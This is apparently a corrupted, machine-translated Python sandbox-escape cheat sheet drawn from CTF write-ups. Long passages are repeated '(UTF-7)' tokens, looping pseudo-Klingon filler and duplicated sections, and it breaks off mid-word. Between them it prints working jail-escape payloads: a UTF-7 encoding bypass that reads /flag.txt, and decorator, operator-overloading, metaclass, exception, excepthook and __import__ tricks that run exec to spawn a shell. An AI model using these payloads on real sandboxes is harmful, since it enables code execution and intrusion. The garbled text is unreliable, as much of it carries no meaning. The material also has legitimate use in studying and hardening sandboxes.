(UTF-7)  (UTF-7)  (UTF-7)  (UTF-7)  (UTF-7)  (UTF-7)  (UTF-7)  (UTF-7)  (UTF-7)  (UTF-7)  (UTF-7)  (UTF-7)  (UTF-7)  (UTF-7)  (UTF-7)  (UTF-7)  (UTF-7)  (UTF-7)  (UTF-7)  (UTF-7)  (UTF-7)  (UTF-7)  (UTF-7)  (UTF-7)  (UTF-7)  (UTF-7)  (UTF-7)  (UTF-7)  (UTF-7)  (UTF-7)  (UTF-7)  (UTF-7)  (UTF-7)  (UTF-7)  (UTF-7)  (UTF-7)  (UTF-7)  (UTF-7)  (UTF-7)  (UTF-7)  (UTF-7)  (UTF-7)  (UTF-7)  (UTF-7)  (UTF-7)  (UTF-7)  (UTF-7)  (UTF-7)  (UTF-7)  (UTF-7)  (UTF-7)  (UTF-7)  (UTF-7)  (UTF-7)  (UTF-7)  (UTF-7)  (UTF-7)  (UTF-7)  (UTF-7)  (UTF-7)  (UTF-7)  (UTF-7)  (UTF-7)  (UTF-7)  (UTF-7)  (UTF-7)  (UTF-7)  (UTF-7)  (UTF-7)  (UTF-7)  (UTF-7)  (UTF-7)  (UTF-7)  (UTF-7)  (UTF-7)  (UTF-7)  (UTF-7)  (UTF-7)  (UTF-7)  (UTF-7)  (UTF-7)  (UTF-7)  (UTF-7)  (UTF-7)  (UTF-7)  (UTF-7)  (UTF-7)  (UTF-7)  (UTF-7)  (UTF-7)  (UTF-7)  (UTF-7)  (UTF-7)  (UTF-7)  (UTF-7)  (UTF-7)  (UTF-7)  (UTF-7)  (UTF-7)  (UTF-7)  (UTF-7)  (UTF-7)  (UTF-7)  (UTF-7)  (UTF-7)  (UTF-7)  (UTF-7)  (UTF-7)  (UTF-7)  (UTF-7)  (UTF-7)  (UTF-7)  (UTF-7)  (UTF-7)  (UTF-7)  (UTF-7)  (UTF-7)  (UTF-7)  (UTF-7)  (UTF-7)  (UTF-7)  (UTF-7)  (UTF-7)  (UTF-7)  (UTF-7)  (UTF-7)  (UTF-7)  (UTF-7)  (UTF-7)  (UTF-7)  (UTF-7)  (UTF-7)  (UTF-7)  (UTF-7)  (UTF-7)  (UTF-7)  (UTF-7)  (UTF-7)  (UTF-7)  (UTF-7)  (UTF-7)  (UTF-7)  (UTF-7)  (UTF-7)  (UTF-7)  (UTF-7)  (UTF-7)  (UTF-7)  (UTF-7)  (UTF-7)  (UTF-7)  (UTF-7)  (UTF-7)  (UTF-7)  (UTF-7)  (UTF-7)  (UTF-7)  (UTF-7)  (UTF-7)  (UTF-7)  (UTF-7)  (UTF-7)  (UTF-7)  (UTF-7)  (UTF-7)  (UTF-7)  (UTF-7)  (UTF-7)  (UTF-7)  (UTF-7)  (UTF-7)  (UTF-7)  (UTF-7)  (UTF-7)  (UTF-7)  (UTF-7)  (UTF-7)  (UTF-7)  (UTF-7)  (UTF-7)  (UTF-7)  (UTF-7)  (UTF-7)  (UTF-7)  (UTF-7)  (UTF-7)  (UTF-7)  (UTF-7)  (UTF-7)  (UTF-7)  (UTF-7)  (UTF-7)  (UTF-7)  (UTF-7)  (UTF-7)  (UTF-7)  (UTF-7)  (UTF-7)  (UTF-7)  (UTF-7)  (UTF-7)  (UTF-7)  (UTF-7)  (UTF-7)  (UTF-7)  (UTF-7)  (UTF-7)  (UTF-7)  (UTF-7)  (UTF-7)  (UTF-7)  (UTF-7)  (UTF-7)  (UTF-7)  (UTF-7)  (UTF-7)  (UTF-7)  (UTF-7)  (UTF-7)  (UTF-7)  (UTF-7)  (UTF-7)  (UTF-7)  (UTF-7)  (UTF-7)  (UTF-7)  (UTF-7)  (UTF-7)  (UTF-7)  (UTF-7)  (UTF-7)  (UTF-7)  (UTF-7)  (UTF-7)  (UTF-7)  (UTF-7)  (UTF-7)  (UTF-7)  (UTF-7)  (UTF-7)  (UTF-7)  (UTF-7)  (UTF-7)  (UTF-7)  (UTF-7)  (UTF-7)  (UTF-7)  (UTF-7)  (UTF-7)  (UTF-7)  (UTF-7)  (UTF-7)  (UTF-7)  (UTF-7)  (UTF-7)  (UTF-7)  (UTF-7)  (UTF-7)  (UTF-7)  (UTF-7)  (UTF-7)  (UTF-7)  (UTF-7)  (UTF-7)  (UTF-7)  (UTF-7)  (UTF-7)  (UTF-7)  (UTF-7)  (UTF-7)  (UTF-7)  (UTF-7)  (UTF-7)  (UTF-7)  (UTF-7)  (UTF-7)  (UTF-7)  (UTF-7)  (UTF-7)  (UTF-7)  (UTF-7)  (UTF-7)  (UTF-7)  (UTF-7)  (UTF-7)  (UTF-7)  (UTF-7)  (UTF-7)  (UTF-7)  (UTF-7)  (UTF-7)  (UTF-7)  (UTF-7)  (UTF-7)  (UTF-7)  (UTF-7)  (UTF-7)  (UTF-7)  (UTF-7)  (UTF-7)  (UTF-7)  (UTF-7)  (UTF-7)  (UTF-7)  (UTF-7)  (UTF-7)  (UTF-7)  (UTF-7)  (UTF-7)  (UTF-7)  (UTF-7)  (UTF-7)  (UTF-7)  (UTF-7)  (UTF-7)  (UTF-7)  (UTF-7)  (UTF-7)  (UTF-7)  (UTF-7)  (UTF-7)  (UTF-7)  (UTF-7)  (UTF-7)  (UTF-7)  (UTF-7)  (UTF-7)  (UTF-7)  (UTF-7)  (UTF-7)  (UTF-7)  (UTF-7)  (UTF-7)  (UTF-7)  (UTF-7)  (UTF-7)  (UTF-7)  (UTF-7)  (UTF-7)  (UTF-7)  (UTF-7)  (UTF-7)  (UTF-7)  (UTF-7)  (UTF-7)  (UTF-7)  (UTF-7)  (UTF-7)  (UTF-7)  (UTF-7)  (UTF-7)  (UTF-7)  (UTF-7)  (UTF-7)  (UTF-7)  (UTF-7)  (UTF-7)  (UTF-7)  (UTF-7)  (UTF-7)  (UTF-7)  (UTF-7)  (UTF-7)  (UTF-7)  (UTF-7)  (UTF-7)  (UTF-7)  (UTF-7)  (UTF-7)  (UTF-7)  (UTF-7)  (UTF-7)  (UTF-7)  (UTF-7)  (UTF-7)  (UTF-7)  (UTF-7)  (UTF-7)  (UTF-7)  (UTF-7)  (UTF-7)  (UTF-7)  (UTF-7)  (UTF-7)  (UTF-7)  (UTF-7)  (UTF-7)  (UTF-7)  (UTF-7)  (UTF-7)  (UTF-7)  (UTF-7)  (UTF-7)  (UTF-7)  (UTF-7)  (UTF-7)  (UTF-7)  (UTF-7)  (UTF-7)  (UTF-7)  (UTF-7)  (UTF-7)  (UTF-7)  (UTF-7)  (UTF-7)  (UTF-7)  (UTF-7)  (UTF-7)  (UTF-7)  (UTF-7)  (UTF-7)  (UTF-7)  (UTF-7)  (UTF-7)  (UTF-7)  (UTF-7)  (UTF-7)  (UTF-7)  (UTF-7)  (UTF-7)  (UTF-7)  (UTF-7)  (UTF-7)  (UTF-7)  (UTF-7)  (UTF-7)  (UTF-7)  (UTF-7)  (UTF-7)  (UTF-7)  (UTF-7)  (UTF-7)  (UTF-7)  (UTF-7)  (UTF-7)  (UTF-7)
```python
assert b"+AAo-".decode("utf_7") == "\n"

payload = """
# -*- coding: utf_7 -*-
def f(x):
return x
#+AAo-print(open("/flag.txt").read())
""".lstrip()
```
**ghItlhvam** vItlhutlh **encodings** **bypass** **luq** **'ej** `raw_unicode_escape` **'ej** `unicode_escape`.

## **Python** **execution** **jatlh** **ghItlhvam** **jail** **'ej** **jatlh** **'e'** **jatlh** **luq** **'ej** **code** **'ej** **commands** **'ej** **execute** **arbitrary functions**.

### RCE **[decorators](https://docs.python.org/3/glossary.html#term-decorator)** **vItlhutlh**
```python
# From https://ur4ndom.dev/posts/2022-07-04-gctf-treebox/
@exec
@input
class X:
pass

# The previous code is equivalent to:
class X:
pass
X = input(X)
X = exec(X)

# So just send your python code when prompted and it will be executed


# Another approach without calling input:
@eval
@'__import__("os").system("sh")'.format
class _:pass
```
### RCE creating objects and overloading

If you can **declare a class** and **create an object** of that class you could **write/overwrite different methods** that can be **triggered** **without** **needing to call them directly**.

#### RCE with custom classes

You can modify some **class methods** (_by overwriting existing class methods or creating a new class_) to make them **execute arbitrary code** when **triggered** without calling them directly.

### RCE creating objects and overloading

If you can **declare a class** and **create an object** of that class you could **write/overwrite different methods** that can be **triggered** **without** **needing to call them directly**.

#### RCE with custom classes

You can modify some **class methods** (_by overwriting existing class methods or creating a new class_) to make them **execute arbitrary code** when **triggered** without calling them directly.
```python
# This class has 3 different ways to trigger RCE without directly calling any function
class RCE:
def __init__(self):
self += "print('Hello from __init__ + __iadd__')"
__iadd__ = exec #Triggered when object is created
def __del__(self):
self -= "print('Hello from __del__ + __isub__')"
__isub__ = exec #Triggered when object is created
__getitem__ = exec #Trigerred with obj[<argument>]
__add__ = exec #Triggered with obj + <argument>

# These lines abuse directly the previous class to get RCE
rce = RCE() #Later we will see how to create objects without calling the constructor
rce["print('Hello from __getitem__')"]
rce + "print('Hello from __add__')"
del rce

# These lines will get RCE when the program is over (exit)
sys.modules["pwnd"] = RCE()
exit()

# Other functions to overwrite
__sub__ (k - 'import os; os.system("sh")')
__mul__ (k * 'import os; os.system("sh")')
__floordiv__ (k // 'import os; os.system("sh")')
__truediv__ (k / 'import os; os.system("sh")')
__mod__ (k % 'import os; os.system("sh")')
__pow__ (k**'import os; os.system("sh")')
__lt__ (k < 'import os; os.system("sh")')
__le__ (k <= 'import os; os.system("sh")')
__eq__ (k == 'import os; os.system("sh")')
__ne__ (k != 'import os; os.system("sh")')
__ge__ (k >= 'import os; os.system("sh")')
__gt__ (k > 'import os; os.system("sh")')
__iadd__ (k += 'import os; os.system("sh")')
__isub__ (k -= 'import os; os.system("sh")')
__imul__ (k *= 'import os; os.system("sh")')
__ifloordiv__ (k //= 'import os; os.system("sh")')
__idiv__ (k /= 'import os; os.system("sh")')
__itruediv__ (k /= 'import os; os.system("sh")') (Note that this only works when from __future__ import division is in effect.)
__imod__ (k %= 'import os; os.system("sh")')
__ipow__ (k **= 'import os; os.system("sh")')
__ilshift__ (k<<= 'import os; os.system("sh")')
__irshift__ (k >>= 'import os; os.system("sh")')
__iand__ (k = 'import os; os.system("sh")')
__ior__ (k |= 'import os; os.system("sh")')
__ixor__ (k ^= 'import os; os.system("sh")')
```
#### [metaclasses](https://docs.python.org/3/reference/datamodel.html#metaclasses) vItlhutlh

**metaclasses** vItlhutlh **ghItlhvam** **ghItlhvam**, **constructor** **ghItlhvam** **ghItlhvam** **ghItlhvam** **ghItlhvam** **ghItlhvam** **ghItlhvam** **ghItlhvam** **ghItlhvam** **ghItlhvam** **ghItlhvam** **ghItlhvam** **ghItlhvam** **ghItlhvam** **ghItlhvam** **ghItlhvam** **ghItlhvam** **ghItlhvam** **ghItlhvam** **ghItlhvam** **ghItlhvam** **ghItlhvam** **ghItlhvam** **ghItlhvam** **ghItlhvam** **ghItlhvam** **ghItlhvam** **ghItlhvam** **ghItlhvam** **ghItlhvam** **ghItlhvam** **ghItlhvam** **ghItlhvam** **ghItlhvam** **ghItlhvam** **ghItlhvam** **ghItlhvam** **ghItlhvam** **ghItlhvam** **ghItlhvam** **ghItlhvam** **ghItlhvam** **ghItlhvam** **ghItlhvam** **ghItlhvam** **ghItlhvam** **ghItlhvam** **ghItlhvam** **ghItlhvam** **ghItlhvam** **ghItlhvam** **ghItlhvam** **ghItlhvam** **ghItlhvam** **ghItlhvam** **ghItlhvam** **ghItlhvam** **ghItlhvam** **ghItlhvam** **ghItlhvam** **ghItlhvam** **ghItlhvam** **ghItlhvam** **ghItlhvam** **ghItlhvam** **ghItlhvam** **ghItlhvam** **ghItlhvam** **ghItlhvam** **ghItlhvam** **ghItlhvam** **ghItlhvam** **ghItlhvam** **ghItlhvam** **ghItlhvam** **ghItlhvam** **ghItlhvam** **ghItlhvam** **ghItlhvam** **ghItlhvam** **ghItlhvam** **ghItlhvam** **ghItlhvam** **ghItlhvam** **ghItlhvam** **ghItlhvam** **ghItlhvam** **ghItlhvam** **ghItlhvam** **ghItlhvam** **ghItlhvam** **ghItlhvam** **ghItlhvam** **ghItlhvam** **ghItlhvam** **ghItlhvam** **ghItlhvam** **ghItlhvam** **ghItlhvam** **ghItlhvam** **ghItlhvam** **ghItlhvam** **ghItlhvam** **ghItlhvam** **ghItlhvam** **ghItlhvam** **ghItlhvam** **ghItlhvam** **ghItlhvam** **ghItlhvam** **ghItlhvam** **ghItlhvam** **ghItlhvam** **ghItlhvam** **ghItlhvam** **ghItlhvam** **ghItlhvam** **ghItlhvam** **ghItlhvam** **ghItlhvam** **ghItlhvam** **ghItlhvam** **ghItlhvam** **ghItlhvam** **ghItlhvam** **ghItlhvam** **ghItlhvam** **ghItlhvam** **ghItlhvam** **ghItlhvam** **ghItlhvam** **ghItlhvam** **ghItlhvam** **ghItlhvam** **ghItlhvam** **ghItlhvam** **ghItlhvam** **ghItlhvam** **ghItlhvam** **ghItlhvam** **ghItlhvam** **ghItlhvam** **ghItlhvam** **ghItlhvam** **ghItlhvam** **ghItlhvam** **ghItlhvam** **ghItlhvam** **ghItlhvam** **ghItlhvam** **ghItlhvam** **ghItlhvam** **ghItlhvam** **ghItlhvam** **ghItlhvam** **ghItlhvam** **ghItlhvam** **ghItlhvam** **ghItlhvam** **ghItlhvam** **ghItlhvam** **ghItlhvam** **ghItlhvam** **ghItlhvam** **ghItlhvam** **ghItlhvam** **ghItlhvam** **ghItlhvam** **ghItlhvam** **ghItlhvam** **ghItlhvam** **ghItlhvam** **ghItlhvam** **ghItlhvam** **ghItlhvam** **ghItlhvam** **ghItlhvam** **ghItlhvam** **ghItlhvam** **ghItlhvam** **ghItlhvam** **ghItlhvam** **ghItlhvam** **ghItlhvam** **ghItlhvam** **ghItlhvam** **ghItlhvam** **ghItlhvam** **ghItlhvam** **ghItlhvam** **ghItlhvam** **ghItlhvam** **ghItlhvam** **ghItlhvam** **ghItlhvam** **ghItlhvam** **ghItlhvam** **ghItlhvam** **ghItlhvam** **ghItlhvam** **ghItlhvam** **ghItlhvam** **ghItlhvam** **ghItlhvam** **ghItlhvam** **ghItlhvam** **ghItlhvam** **ghItlhvam** **ghItlhvam** **ghItlhvam** **ghItlhvam** **ghItlhvam** **ghItlhvam** **ghItlhvam** **ghItlhvam** **ghItlhvam** **ghItlhvam** **ghItlhvam** **ghItlhvam** **ghItlhvam** **ghItlhvam** **ghItlhvam** **ghItlhvam** **ghItlhvam** **ghItlhvam** **ghItlhvam** **ghItlhvam** **ghItlhvam** **ghItlhvam** **ghItlhvam** **ghItlhvam** **ghItlhvam** **ghItlhvam** **ghItlhvam** **ghItlhvam** **ghItlhvam** **ghItlhvam** **ghItlhvam** **ghItlhvam** **ghItlhvam** **ghItlhvam** **ghItlhvam** **ghItlhvam** **ghItlhvam** **ghItlhvam** **ghItlhvam** **ghItlhvam** **ghItlhvam** **ghItlhvam** **ghItlhvam** **ghItlhvam** **ghItlhvam** **ghItlhvam** **ghItlhvam** **ghItlhvam** **ghItlhvam** **ghItlhvam** **ghItlhvam** **ghItlhvam** **ghItlhvam** **ghItlhvam** **ghItlhvam** **ghItlhvam** **ghItlhvam** **ghItlhvam** **ghItlhvam** **ghItlhvam** **ghItlhvam** **ghItlhvam** **ghItlhvam** **ghItlhvam** **ghItlhvam** **ghItlhvam** **ghItlhvam** **ghItlhvam** **ghItlhvam** **ghItlhvam** **ghItlhvam** **ghItlhvam** **ghItlhvam** **ghItlhvam** **ghItlhvam** **ghItlhvam** **ghItlhvam** **ghItlhvam** **ghItlhvam** **ghItlhvam** **ghItlhvam** **ghItlhvam** **ghItlhvam** **ghItlhvam** **ghItlhvam** **ghItlhvam** **ghItlhvam** **ghItlhvam** **ghItlhvam** **ghItlhvam** **ghItlhvam** **ghItlhvam** **ghItlhvam** **ghItlhvam** **ghItlhvam** **ghItlhvam** **ghItlhvam** **ghItlhvam** **ghItlhvam** **ghItlhvam** **ghItlhvam** **ghItlhvam** **ghItlhvam** **ghItlhvam** **ghItlhvam** **ghItlhvam** **ghItlhvam** **ghItlhvam** **ghItlhvam** **ghItlhvam** **ghItlhvam** **ghItlhvam** **ghItlhvam** **ghItlhvam** **ghItlhvam** **ghItlhvam** **ghItlhvam** **ghItlhvam** **ghItlhvam** **ghItlhvam** **ghItlhvam** **ghItlhvam** **ghItlhvam** **ghItlhvam** **ghItlhvam** **ghItlhvam** **ghItlhvam** **ghItlhvam** **ghItlhvam** **ghItlhvam** **ghItlhvam** **ghItlhvam** **ghItlhvam** **ghItlhvam** **ghItlhvam** **ghItlhvam** **ghItlhvam** **ghItlhvam** **ghItlhvam** **ghItlhvam** **ghItlhvam** **ghItlhvam** **ghItlhvam** **ghItlhvam** **ghItlhvam** **ghItlhvam** **ghItlhvam** **ghItlhvam** **ghItlhvam** **ghItlhvam** **ghItlhvam** **ghItlhvam** **ghItlhvam** **ghItlhvam** **ghItlhvam** **ghItlhvam** **ghItlhvam** **ghItlhvam** **ghItlhvam** **ghItlhvam** **ghItlhvam** **ghItlhvam** **ghItlhvam** **ghItlhvam** **ghItlhvam** **ghItlhvam** **ghItlhvam** **ghItlhvam** **ghItlhvam** **ghItlhvam** **ghItlhvam** **ghItlhvam** **ghItlhvam** **ghItlhvam** **ghItlhvam** **ghItlhvam** **ghItlhvam** **ghItlhvam** **ghItlhvam** **ghItlhvam** **ghItlhvam** **ghItlhvam** **ghItlhvam** **ghItlhvam** **ghItlhvam** **ghItlhvam** **ghItlhvam** **ghItlhvam** **ghItlhvam** **ghItlhvam** **ghItlhvam** **ghItlhvam** **ghItlhvam** **ghItlhvam** **ghItlhvam** **ghItlhvam** **ghItlhvam** **ghItlhvam** **ghItlhvam** **ghItlhvam** **ghItlhvam** **ghItlhvam** **ghItlhvam** **ghItlhvam** **ghItlhvam** **ghItlhvam** **ghItlhvam** **ghItlhvam** **ghItlhvam** **ghItlhvam** **ghItlhvam** **ghItlhvam** **ghItlhvam** **ghItlhvam** **ghItlhvam** **ghItlhvam** **ghItlhvam** **ghItlhvam** **ghItlhvam** **ghItlhvam** **ghItlhvam** **ghItlhvam** **ghItlhvam** **ghItlhvam** **ghItlhvam** **ghItlhvam** **ghItlhvam** **ghItlhvam** **ghItlhvam** **ghItlhvam** **ghItlhvam** **ghItlhvam** **ghItlhvam** **ghItlhvam** **ghItlhvam** **ghItlhvam** **ghItlhvam** **ghItlhvam** **ghItlhvam** **ghItlhvam** **ghItlhvam** **ghItlhvam** **ghItlhvam** **ghItlhvam** **ghItlhvam** **ghItlhvam** **ghItlhvam** **ghItlhvam** **ghItlhvam** **ghItlhvam** **ghItlhvam** **ghItlhvam** **ghItlhvam** **ghItlhvam** **ghItlhvam** **ghItlhvam** **ghItlhvam** **ghItlhvam** **ghItlhvam** **ghItlhvam** **ghItlhvam** **ghItlhvam** **ghItlhvam** **ghItlhvam** **ghItlhvam** **ghItlhvam** **ghItlhvam** **ghItlhvam** **ghItlhvam** **ghItlhvam** **ghItlhvam** **ghItlhvam** **ghItlhvam** **ghItlhvam** **ghItlhvam** **ghItlhvam** **ghItlhvam** **ghItlhvam** **ghItlhvam** **ghItlhvam** **ghItlhvam** **ghItlhvam** **ghItlhvam** **ghItlhvam** **ghItlhvam** **ghItlhvam** **ghItlhvam** **ghItlhvam** **ghItlhvam** **ghItlhvam** **ghItlhvam** **ghItlhvam** **ghItlhvam** **ghItlhvam** **ghItlhvam** **ghItlhvam** **ghItlhvam** **ghItlhvam** **ghItlhvam** **ghItlhvam** **ghItlhvam** **ghItlhvam** **ghItlhvam** **ghItlhvam** **ghItlhvam** **ghItlhvam** **ghItlhvam** **ghItlhvam** **ghItlhvam** **ghItlhvam** **ghItlhvam** **ghItlhvam** **ghItlhvam** **ghItlhvam** **ghItlhvam** **ghItlhvam** **ghItlhvam** **ghItlhvam** **ghItlhvam** **ghItlhvam** **ghItlhvam** **ghItlhvam** **ghItlhvam** **ghItlhvam** **ghItlhvam** **ghItlhvam** **ghItlhvam** **ghItlhvam** **ghItlhvam** **ghItlhvam** **ghItlhvam** **ghItlhvam** **ghItlhvam** **ghItlhvam** **ghItlhvam** **ghItlhvam** **ghItlhvam** **ghItlhvam** **ghItlhv
```python
# Code from https://ur4ndom.dev/posts/2022-07-04-gctf-treebox/ and fixed
# This will define the members of the "subclass"
class Metaclass(type):
__getitem__ = exec # So Sub[string] will execute exec(string)
# Note: Metaclass.__class__ == type

class Sub(metaclass=Metaclass): # That's how we make Sub.__class__ == Metaclass
pass # Nothing special to do

Sub['import os; os.system("sh")']

## You can also use the tricks from the previous section to get RCE with this object
```
#### Creating objects with exceptions

**QaStaHvIS** **ghItlh** **exception** **trigger** **vItlhutlh** **Exception** **ghItlh** **object** **tlhutlh** **constructor** **cha'logh** **ghItlh** **vItlhutlh** (a trick from [**@\_nag0mez**](https://mobile.twitter.com/\_nag0mez)):
```python
class RCE(Exception):
def __init__(self):
self += 'import os; os.system("sh")'
__iadd__ = exec #Triggered when object is created
raise RCE #Generate RCE object


# RCE with __add__ overloading and try/except + raise generated object
class Klecko(Exception):
__add__ = exec

try:
raise Klecko
except Klecko as k:
k + 'import os; os.system("sh")' #RCE abusing __add__

## You can also use the tricks from the previous section to get RCE with this object
```
### More RCE

### **QaHvIS RCE**

#### **QaHvIS RCE** (Remote Code Execution) is a technique used to execute arbitrary code on a remote system. It allows an attacker to gain unauthorized access and control over the target system.

#### **QaHvIS RCE** can be achieved through various vulnerabilities, such as:

- **Command Injection**: This occurs when an attacker is able to inject malicious commands into a vulnerable application, which are then executed by the system.

- **Code Injection**: This involves injecting malicious code into a vulnerable application, which is then executed by the system.

- **File Inclusion**: This occurs when an attacker is able to include and execute arbitrary files on a vulnerable system.

- **Deserialization**: This involves exploiting vulnerabilities in the deserialization process to execute arbitrary code.

#### **QaHvIS RCE** can have severe consequences, as it allows an attacker to gain complete control over the target system. This can lead to data theft, unauthorized access, and further exploitation of the compromised system.

#### To protect against **QaHvIS RCE**, it is important to:

- Keep all software and applications up to date with the latest security patches.

- Implement proper input validation and sanitization techniques to prevent command and code injection.

- Use secure coding practices to minimize the risk of vulnerabilities.

- Regularly perform security assessments and penetration testing to identify and address any potential vulnerabilities.

#### **QaHvIS RCE** is a powerful technique that requires careful consideration and mitigation to ensure the security of systems and data.
```python
# From https://ur4ndom.dev/posts/2022-07-04-gctf-treebox/
# If sys is imported, you can sys.excepthook and trigger it by triggering an error
class X:
def __init__(self, a, b, c):
self += "os.system('sh')"
__iadd__ = exec
sys.excepthook = X
1/0 #Trigger it

# From https://github.com/google/google-ctf/blob/master/2022/sandbox-treebox/healthcheck/solution.py
# The interpreter will try to import an apt-specific module to potentially
# report an error in ubuntu-provided modules.
# Therefore the __import__ functions are overwritten with our RCE
class X():
def __init__(self, a, b, c, d, e):
self += "print(open('flag').read())"
__iadd__ = eval
__builtins__.__import__ = X
{}[1337]
```
### qarDaS builtins veDDaq & license

#### qarDaS builtins veDDaq

`builtins` qarDaS jatlhlaHbe'chugh, 'ej qarDaS jatlhlaHbe'chugh 'e' vItlhutlh. 'e' vItlhutlh qarDaS jatlhlaHbe'chugh 'e' vItlhutlh. 'e' vItlhutlh qarDaS jatlhlaHbe'chugh 'e' vItlhutlh. 'e' vItlhutlh qarDaS jatlhlaHbe'chugh 'e' vItlhutlh. 'e' vItlhutlh qarDaS jatlhlaHbe'chugh 'e' vItlhutlh. 'e' vItlhutlh qarDaS jatlhlaHbe'chugh 'e' vItlhutlh. 'e' vItlhutlh qarDaS jatlhlaHbe'chugh 'e' vItlhutlh. 'e' vItlhutlh qarDaS jatlhlaHbe'chugh 'e' vItlhutlh. 'e' vItlhutlh qarDaS jatlhlaHbe'chugh 'e' vItlhutlh. 'e' vItlhutlh qarDaS jatlhlaHbe'chugh 'e' vItlhutlh. 'e' vItlhutlh qarDaS jatlhlaHbe'chugh 'e' vItlhutlh. 'e' vItlhutlh qarDaS jatlhlaHbe'chugh 'e' vItlhutlh. 'e' vItlhutlh qarDaS jatlhlaHbe'chugh 'e' vItlhutlh. 'e' vItlhutlh qarDaS jatlhlaHbe'chugh 'e' vItlhutlh. 'e' vItlhutlh qarDaS jatlhlaHbe'chugh 'e' vItlhutlh. 'e' vItlhutlh qarDaS jatlhlaHbe'chugh 'e' vItlhutlh. 'e' vItlhutlh qarDaS jatlhlaHbe'chugh 'e' vItlhutlh. 'e' vItlhutlh qarDaS jatlhlaHbe'chugh 'e' vItlhutlh. 'e' vItlhutlh qarDaS jatlhlaHbe'chugh 'e' vItlhutlh. 'e' vItlhutlh qarDaS jatlhlaHbe'chugh 'e' vItlhutlh. 'e' vItlhutlh qarDaS jatlhlaHbe'chugh 'e' vItlhutlh. 'e' vItlhutlh qarDaS jatlhlaHbe'chugh 'e' vItlhutlh. 'e' vItlhutlh qarDaS jatlhlaHbe'chugh 'e' vItlhutlh. 'e' vItlhutlh qarDaS jatlhlaHbe'chugh 'e' vItlhutlh. 'e' vItlhutlh qarDaS jatlhlaHbe'chugh 'e' vItlhutlh. 'e' vItlhutlh qarDaS jatlhlaHbe'chugh 'e' vItlhutlh. 'e' vItlhutlh qarDaS jatlhlaHbe'chugh 'e' vItlhutlh. 'e' vItlhutlh qarDaS jatlhlaHbe'chugh 'e' vItlhutlh. 'e' vItlhutlh qarDaS jatlhlaHbe'chugh 'e' vItlhutlh. 'e' vItlhutlh qarDaS jatlhlaHbe'chugh 'e' vItlhutlh. 'e' vItlhutlh qarDaS jatlhlaHbe'chugh 'e' vItlhutlh. 'e' vItlhutlh qarDaS jatlhlaHbe'chugh 'e' vItlhutlh. 'e' vItlhutlh qarDaS jatlhlaHbe'chugh 'e' vItlhutlh. 'e' vItlhutlh qarDaS jatlhlaHbe'chugh 'e' vItlhutlh. 'e' vItlhutlh qarDaS jatlhlaHbe'chugh 'e' vItlhutlh. 'e' vItlhutlh qarDaS jatlhlaHbe'chugh 'e' vItlhutlh. 'e' vItlhutlh qarDaS jatlhlaHbe'chugh 'e' vItlhutlh. 'e' vItlhutlh qarDaS jatlhlaHbe'chugh 'e' vItlhutlh. 'e' vItlhutlh qarDaS jatlhlaHbe'chugh 'e' vItlhutlh. 'e' vItlhutlh qarDaS jatlhlaHbe'chugh 'e' vItlhutlh. 'e' vItlhutlh qarDaS jatlhlaHbe'chugh 'e' vItlhutlh. 'e' vItlhutlh qarDaS jatlhlaHbe'chugh 'e' vItlhutlh. 'e' vItlhutlh qarDaS jatlhlaHbe'chugh 'e' vItlhutlh. 'e' vItlhutlh qarDaS jatlhlaHbe'chugh 'e' vItlhutlh. 'e' vItlhutlh qarDaS jatlhlaHbe'chugh 'e' vItlhutlh. 'e' vItlhutlh qarDaS jatlhlaHbe'chugh 'e' vItlhutlh. 'e' vItlhutlh qarDaS jatlhlaHbe'chugh 'e' vItlhutlh. 'e' vItlhutlh qarDaS jatlhlaHbe'chugh 'e' vItlhutlh. 'e' vItlhutlh qarDaS jatlhlaHbe'chugh 'e' vItlhutlh. 'e' vItlhutlh qarDaS jatlhlaHbe'chugh 'e' vItlhutlh. 'e' vItlhutlh qarDaS jatlhlaHbe'chugh 'e' vItlhutlh. 'e' vItlhutlh qarDaS jatlhlaHbe'chugh 'e' vItlhutlh. 'e' vItlhutlh qarDaS jatlhlaHbe'chugh 'e' vItlhutlh. 'e' vItlhutlh qarDaS jatlhlaHbe'chugh 'e' vItlhutlh. 'e' vItlhutlh qarDaS jatlhlaHbe'chugh 'e' vItlhutlh. 'e' vItlhutlh qarDaS jatlhlaHbe'chugh 'e' vItlhutlh. 'e' vItlhutlh qarDaS jatlhlaHbe'chugh 'e' vItlhutlh. 'e' vItlhutlh qarDaS jatlhlaHbe'chugh 'e' vItlhutlh. 'e' vItlhutlh qarDaS jatlhlaHbe'chugh 'e' vItlhutlh. 'e' vItlhutlh qarDaS jatlhlaHbe'chugh 'e' vItlhutlh. 'e' vItlhutlh qarDaS jatlhlaHbe'chugh 'e' vItlhutlh. 'e' vItlhutlh qarDaS jatlhlaHbe'chugh 'e' vItlhutlh. 'e' vItlhutlh qarDaS jatlhlaHbe'chugh 'e' vItlhutlh. 'e' vItlhutlh qarDaS jatlhlaHbe'chugh 'e' vItlhutlh. 'e' vItlhutlh qarDaS jatlhlaHbe'chugh 'e' vItlhutlh. 'e' vItlhutlh qarDaS jatlhlaHbe'chugh 'e' vItlhutlh. 'e' vItlhutlh qarDaS jatlhlaHbe'chugh 'e' vItlhutlh. 'e' vItlhutlh qarDaS jatlhlaHbe'chugh 'e' vItlhutlh. 'e' vItlhutlh qarDaS jatlhlaHbe'chugh 'e' vItlhutlh. 'e' vItlhutlh qarDaS jatlhlaHbe'chugh 'e' vItlhutlh. 'e' vItlhutlh qarDaS jatlhlaHbe'chugh 'e' vItlhutlh. 'e' vItlhutlh qarDaS jatlhlaHbe'chugh 'e' vItlhutlh. 'e' vItlhutlh qarDaS jatlhlaHbe'chugh 'e' vItlhutlh. 'e' vItlhutlh qarDaS jatlhlaHbe'chugh 'e' vItlhutlh. 'e' vItlhutlh qarDaS jatlhlaHbe'chugh 'e' vItlhutlh. 'e' vItlhutlh qarDaS jatlhlaHbe'chugh 'e' vItlhutlh. 'e' vItlhutlh qarDaS jatlhlaHbe'chugh 'e' vItlhutlh. 'e' vItlhutlh qarDaS jatlhlaHbe'chugh 'e' vItlhutlh. 'e' vItlhutlh qarDaS jatlhlaHbe'chugh 'e' vItlhutlh. 'e' vItlhutlh qarDaS jatlhlaHbe'chugh 'e' vItlhutlh. 'e' vItlhutlh qarDaS jatlhlaHbe'chugh 'e' vItlhutlh. 'e' vItlhutlh qarDaS jatlhlaHbe'chugh 'e' vItlhutlh. 'e' vItlhutlh qarDaS jatlhlaHbe'chugh 'e' vItlhutlh. 'e' vItlhutlh qarDaS jatlhlaHbe'chugh 'e' vItlhutlh. 'e' vItlhutlh qarDaS jatlhlaHbe'chugh 'e' vItlhutlh. 'e' vItlhutlh qarDaS 